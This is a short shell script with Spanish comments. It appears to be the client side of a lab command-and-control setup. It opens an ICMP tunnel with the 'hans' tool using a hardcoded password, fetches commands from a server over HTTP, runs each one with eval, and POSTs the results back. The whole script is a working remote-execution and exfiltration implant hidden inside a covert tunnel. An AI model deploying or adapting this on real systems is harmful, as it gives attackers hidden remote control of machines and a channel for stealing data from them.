#!/bin/sh
set -e

SERVER_IP="${SERVER_IP:-172.21.0.10}"
ROUTER_IP="${ROUTER_IP:-172.22.0.2}"
CLIENT_ID="${CLIENT_ID:-cliente-001}"
TUNNEL_SERVER="10.1.2.1"

echo "[*] Cliente ID: $CLIENT_ID"
ip route add ${SERVER_IP}/32 via ${ROUTER_IP} || true

echo "[*] Conectando al servidor hans..."
hans -c "$SERVER_IP" -p tunel123 -f &
HANS_PID=$!

sleep 3

echo "[*] GET comandos..."
COMANDOS=$(curl -s -H "X-ID-CLIENTE: $CLIENT_ID" http://$TUNNEL_SERVER/)
echo "$COMANDOS"

echo "[*] Ejecutando comandos..."
RESULTADO=$(echo "$COMANDOS" | while IFS= read -r cmd; do
    [ -z "$cmd" ] && continue
    echo ">>> $cmd"
    eval "$cmd" 2>&1
    echo ""
done)
 
echo "[*] Resultado:"
echo "$RESULTADO"
 
echo "[*] Enviando resultado al servidor..."
curl -s -X POST \
  -H "X-ID-CLIENTE: $CLIENT_ID" \
  -d "$RESULTADO" \
  http://$TUNNEL_SERVER/
 
echo "[+] Listo."
wait $HANS_PID